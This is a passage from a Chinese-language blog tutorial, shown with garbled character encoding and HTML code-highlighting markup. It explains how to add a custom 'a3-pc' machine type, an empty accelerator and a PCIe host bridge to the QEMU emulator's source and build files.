class="hljs-string">&quot;x<span class="hljs-variable">$opt</span>&quot;</span> : <span class="hljs-string">&#x27;x[^=]*=\(.*\)&#x27;</span>)<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$opt</span>&quot;</span> <span class="hljs-keyword">in</span><br>  --<span class="hljs-built_in">help</span>|-h) show_help=<span class="hljs-built_in">yes</span><br>  ;;<br>  <span class="hljs-comment">#...</span><br>  ;;<br>  --enable-a3-pc) a3_pc=<span class="hljs-string">&quot;yes&quot;</span><br>  ;;<br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># è¿™ä¸€å—å¯ä»¥æ”¾åœ¨ supported_whpx_target çš„é‚£ä¸ªè¯­å¥å—ä¸‹é¢</span><br><span class="hljs-keyword">if</span> supported_a3_pc_target <span class="hljs-variable">$target</span>; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_target_mak</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_host_mak</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æƒ³è¦æ”¹å˜ç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ï¼Œè¿˜å¯ä»¥åœ¨ <code>Makefile.target</code> ä¸­ä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> CONFIG_USER_ONLY<br><span class="hljs-comment"># user emulator name</span><br>QEMU_PROG=qemu-<span class="hljs-variable">$(TARGET_NAME)</span><br>QEMU_PROG_BUILD = <span class="hljs-variable">$(QEMU_PROG)</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">ifdef</span> CONFIG_A3_PC<br><span class="hljs-comment"># arttnba3 type machine</span><br>QEMU_PROG=a3-pc<br><span class="hljs-keyword">else</span><br><span class="hljs-comment"># system emulator name</span><br>QEMU_PROG=qemu-system-<span class="hljs-variable">$(TARGET_NAME)</span><span class="hljs-variable">$(EXESUF)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€å®šä¹‰æ–°çš„-Machine-Type">äºŒã€å®šä¹‰æ–°çš„ Machine Type</h2><h3 id="Iã€machine-cï¼šmachine-åŸºæœ¬å®šä¹‰">Iã€machine.cï¼šmachine åŸºæœ¬å®šä¹‰</h3><p>è™½ç„¶ Qemu æ˜¯ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„ï¼Œä½†æ˜¯åœ¨ Qemu å½“ä¸­åŒæ ·ä½¿ç”¨äº† OOP çš„æ€æƒ³ï¼Œé€šè¿‡ç»“æ„ä½“åµŒå¥—çš„å½¢å¼å®ç°ç»§æ‰¿</p><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ <code>MachineState</code> ç»“æ„ä½“ç±»å‹è¡¨ç¤ºä¸€ä¸ªé€šç”¨è™šæ‹Ÿæœºçš„çŠ¶æ€ï¼Œä½¿ç”¨ <code>MachineClass</code> ç»“æ„ä½“ç±»å‹è¡¨ç¤ºä¸€ä¸ªé€šç”¨çš„è™šæ‹Ÿæœºç±»å‹ï¼Œå› æ­¤å¯¹äºæˆ‘ä»¬éœ€è¦åˆ›å»ºçš„æ–°çš„æœºå™¨ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦åˆ†åˆ«å®šä¹‰ä»–çš„çŠ¶æ€ç±»ä¸ç±»å‹ç±»ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/sysemu.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    Notifier machine_done;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineClass parent;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹äºç»§æ‰¿è‡ª MachineState çš„å­ç±»æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ <code>Notifier</code> ç±»å‹çš„æˆå‘˜ï¼Œå¯ä»¥ç”¨æ¥åœ¨åé¢æ„å»ºäº‹ä»¶é€šçŸ¥é“¾</p><p>æˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€äº›ç›¸åº”çš„çˆ¶å­ç±»é—´è½¬å‹çš„å®ï¼Œä»¥åŠä¸€ä¸ªè¡¨ç¤ºæ–°å¢çš„ <code>a3-pc</code> ç±»å‹çš„å®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3PC_MACHINE MACHINE_TYPE_NAME(<span class="hljs-string">&quot;a3-pc&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCMachineState, (obj), TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCMachineClass, obj, TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCMachineClass, klass, TYPE_A3PC_MACHINE)</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å®šä¹‰ MachineState ä¸ MachineClass çš„åˆå§‹åŒ–å‡½æ•°ï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªæœ€æœ€ç®€å•çš„ç©ºæ¨¡æ¿ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init_done</span><span class="hljs-params">(Notifier *notifier, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    MachineClass *mc = MACHINE_CLASS(oc);<br><br>    mc-&gt;init = a3_pc_machine_init;<br>    <span class="hljs-comment">// è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡å®šäº†ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ accelerator</span><br>    mc-&gt;default_machine_opts = <span class="hljs-string">&quot;accel=a3acl&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å£°æ˜ä¸€ä¸ª <code>TypeInfo</code> ç±»å‹çš„å˜é‡ï¼Œç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬æ–°å»ºçš„è¿™ä¸€ç§æœºå™¨ç±»å‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_machine_info = &#123;<br>    .name = TYPE_A3PC_MACHINE,<br>    .parent = TYPE_MACHINE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineClass),<br>    .class_init = a3_pc_machine_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ³¨å†Œæˆ‘ä»¬çš„æ–°æœºå™¨ç±»å‹äº†ï¼Œè¿™é‡Œä½¿ç”¨ <code>type_init()</code> æ¥å®Œæˆï¼ŒåŸç†æ˜¯ gcc constructor attribute ä½¿å…¶ä¼šè°ƒç”¨ <code>a3_pc_machine_register()</code> æ¥æ³¨å†Œ <code>a3_pc_machine_info</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_machine_info);<br>&#125;<br>type_init(a3_pc_machine_register);<br></code></pre></td></tr></table></figure><h3 id="IIã€accel-cï¼šaccelerator-å®šä¹‰">IIã€accel.cï¼šaccelerator å®šä¹‰</h3><p>æ¥ä¸‹æ¥å°±æ˜¯å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„ acceleratorï¼Œå› ä¸º Qemu é»˜è®¤éœ€è¦ä¸€ä¸ª acceleratorï¼Œä½†å¦‚æœå†å»å’ŒåŸæœ‰çš„ accelerator åšé€‚é…å°±å¤ªéº»çƒ¦äº†ï¼ˆ<s>å› ä¸ºğŸ‘´æ˜¯æ‡’ğŸ•</s>ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è‡ªå·±å®šä¹‰ä¸€ä¸ªç©ºçš„ acceleratorï¼Œä¸è¿‡è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬åªéœ€è¦å£°æ˜ä¸€ä¸ªæ–°çš„ <code>TypeInfo</code> ç±»å‹å˜é‡å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-core.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel.h&quot;</span></span><br><br><span class="hljs-type">bool</span> a3_pc_allowed;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_init</span><span class="hljs-params">(MachineState *ms)</span><br>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * opt out of system RAM being allocated by generic code</span><br><span class="hljs-comment">     */</span><br>    mc-&gt;default_ram_id = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_accel_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelClass *ac = ACCEL_CLASS(oc);<br>    <span class="hljs-type">static</span> GlobalProperty compat[] = &#123;<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;store-global-state&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-configuration&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-section-footer&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>    &#125;;<br><br>    ac-&gt;name = <span class="hljs-string">&quot;A3ACL&quot;</span>;<br>    ac-&gt;init_machine = a3_pc_init;<br>    ac-&gt;allowed = &amp;a3_pc_allowed;<br>    ac-&gt;compat_props = g_ptr_array_new();<br><br>    compat_props_add(ac-&gt;compat_props, compat, G_N_ELEMENTS(compat));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_ACCEL ACCEL_CLASS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_accel_type = &#123;<br>    .name = TYPE_A3_ACCEL,<br>    .parent = TYPE_ACCEL,<br>    .class_init = a3_pc_accel_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_type_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_accel_type);<br>&#125;<br><br>type_init(a3_pc_type_init);<br></code></pre></td></tr></table></figure><h4 id="æ–°ç‰ˆæœ¬-accelerator-é¢å¤–æ·»åŠ -ops">*æ–°ç‰ˆæœ¬ accelerator é¢å¤–æ·»åŠ  ops</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯ qemu çš„ 7.0 å’Œ 5.0 çš„ç‰ˆæœ¬ä¹‹é—´ä»£ç æ¶æ„æœ‰ä¸€å®šçš„æ”¹åŠ¨ï¼Œæ‰€ä»¥å¯¹äº 7.0 ç‰ˆæœ¬æˆ‘ä»¬è¿˜éœ€è¦é¢å¤–å®šä¹‰ä¸€ä¸ª AccelClassOpsï¼š</p><blockquote><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨åŸæœ‰çš„ accelerator ï¼Œæ¯”å¦‚è¯´ <code>tcg</code>ï¼Œç›´æ¥åœ¨ machine.c ä»£ç ä¸­æŒ‡å®š <code>accel=tcg</code> å³å¯</p></blockquote><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šaccel/a3acl/a3acl-accel-ops.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * QEMU A3ACL vCPU common functionality</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Copyright (c) 22 arttnba3</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Just modify it like what you want : )</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel-ops.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_handle_interrupt</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> mask)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_kick_vcpu_thread</span><span class="hljs-params">(CPUState *unused)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_start_vcpu_thread</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_init</span><span class="hljs-params">(AccelOpsClass *ops)</span><br>&#123;<br>    <span class="hljs-comment">// è¿™å‡ ä¸ªå‡½æ•°å¯ä»¥æŒ‰ç…§ä¸ªäººéœ€è¦æ¥è¿›è¡Œæ”¹é€ ï¼Œç¬”è€…è¿™é‡Œä»…ä½œå ä½ç¬¦</span><br>    ops-&gt;create_vcpu_thread = a3acl_start_vcpu_thread;<br>    ops-&gt;kick_vcpu_thread = a3acl_kick_vcpu_thread;<br>    ops-&gt;handle_interrupt = a3acl_handle_interrupt;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelOpsClass *ops = ACCEL_OPS_CLASS(oc);<br><br>    ops-&gt;ops_init = a3acl_accel_ops_init;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3acl_accel_ops_type = &#123;<br>    .name = ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>),<br>    .parent = TYPE_ACCEL_OPS,<br>    .class_init = a3acl_accel_ops_class_init,<br>    .abstract = <span class="hljs-literal">true</span>,<br>&#125;;<br>module_obj(ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>));<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3acl_accel_ops_type);<br>&#125;<br>type_init(a3acl_accel_ops_register_types);<br><br></code></pre></td></tr></table></figure><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šaccel/a3acl/meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3acl_ss = ss.source_set()<br>a3acl_ss.add(files(<br>  &#x27;a3acl-accel-ops.c&#x27;,<br>))<br><br>specific_ss.add_all(when: &#x27;CONFIG_A3ACL&#x27;, if_true: a3acl_ss)<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ–‡ä»¶ï¼šaccel/meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs meson">if have_system<br>  subdir(&#x27;hvf&#x27;)<br>  subdir(&#x27;qtest&#x27;)<br>  subdir(&#x27;kvm&#x27;)<br>  subdir(&#x27;xen&#x27;)<br>  subdir(&#x27;stubs&#x27;)<br>  subdir(&#x27;a3acl&#x27;) # åŠ ä¸Šè¿™å¥<br>endif<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ–‡ä»¶ï¼šaccel/Kconfig</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig"># æ·»åŠ ä¸Šè¿™ï¼š<br>config A3ACL<br>    bool<br>    default y<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ·»åŠ è®¾å¤‡ç»“æ„ğŸ•Š">ä¸‰ã€æ·»åŠ è®¾å¤‡ç»“æ„ğŸ•Š</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€å°å¯ä»¥è¿è¡Œçš„ç©ºç™½çš„æœºå™¨â€”â€”ä½†åŒ…æ‹¬ CPU åœ¨å†…çš„æ‰€æœ‰è®¾å¤‡ç›®å‰æš‚ä¸”éƒ½æ˜¯ä¸å­˜åœ¨çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åœ°æ„é€ æœºå™¨çš„è®¾å¤‡ç»“æ„</p><h3 id="Iã€æ·»åŠ æ–°çš„-PCIe-Host-Bridge">Iã€æ·»åŠ æ–°çš„ PCIe Host Bridge</h3><p>ä¸€ä¸ªç©ºçš„æœºå™¨ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé‚£è‡ªç„¶æ˜¯ä»€ä¹ˆéƒ½å¹²ä¸äº†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦ä¸ºè¿™ä¸ªæœºå™¨æ·»åŠ ä¸Šä¸€ä¸ª <code>PCIe Host Bridge</code>ï¼Œä»è€Œè®©æˆ‘ä»¬çš„æœºå™¨å¯ä»¥æ·»åŠ æ–°çš„ PCIe è®¾å¤‡</p><p>æƒ¯ä¾‹åœ°å°±æ˜¯å®šä¹‰ä¸€ä¸ªæ–°çš„ <code>PCIe Host Bridge</code> ç±»å‹çš„æ–° PCIe è®¾å¤‡ï¼š</p><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šinclude/hw/pci-host/a3pc.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HW_A3_PC_PCIE_HOST_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HW_A3_PC_PCIE_HOST_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCPCIEHost</span> &#123;</span><br>    PCIExpressHost parent_obj;<br><br>    MemoryRegion mem;<br>    MemoryRegion io;<br>&#125; A3PCPCIEHost;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_PC_PCIE_HOST <span class="hljs-string">&quot;a3-pc-pcie-host&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3_PC_PCIE_HOST(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCPCIEHost, (obj), TYPE_A3_PC_PCIE_HOST)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HW_A3_PC_PCIE_HOST_H */</span></span><br></code></pre></td></tr></table></figure><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šhw/pci-host/a3pc.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 